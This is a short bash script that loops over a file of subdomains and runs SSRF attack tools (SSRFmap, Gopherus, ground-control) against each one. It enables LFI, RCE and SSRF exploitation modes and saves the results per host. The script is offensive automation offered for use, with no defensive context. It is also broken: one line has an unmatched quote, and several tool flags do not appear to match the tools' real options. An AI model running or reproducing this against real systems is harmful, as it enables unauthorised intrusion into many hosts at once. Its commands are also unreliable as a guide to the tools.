#!/bin/bash

output_dir=$1
subdomains_file="${output_dir}/subdomains.txt"
output_folder="$output_dir/server_side_request_forgery"
mkdir -p "$output_folder"

# Loop through each subdomain in the file
while IFS= read -r subdomain; do
    target=$subdomain"

    echo "[] Running SSRFmap on $target..."
    python3 /opt/SSRFmap/ssrfmap -u "$target" --timeout 3 --delay 1 --skip --level 3 --prefix "http://127.0.0.1" > "$output_folder/$subdomain-ssrfmap.txt"

    echo "[] Running Gopherus on $target..."
    gopherus -u "$target" -p "80" -g "true" --lfi --rce --xss --redirect --ssrf -o "$output_folder/$subdomain-gopherus.txt"

    echo "[] Running ground-control on $target..."
    ground-control --url "$target" --mode full > "$output_folder/$subdomain-ground-control.txt"

    echo "[] Server Side Request Forgery completed for $subdomain!"
done < "$subdomains_file"
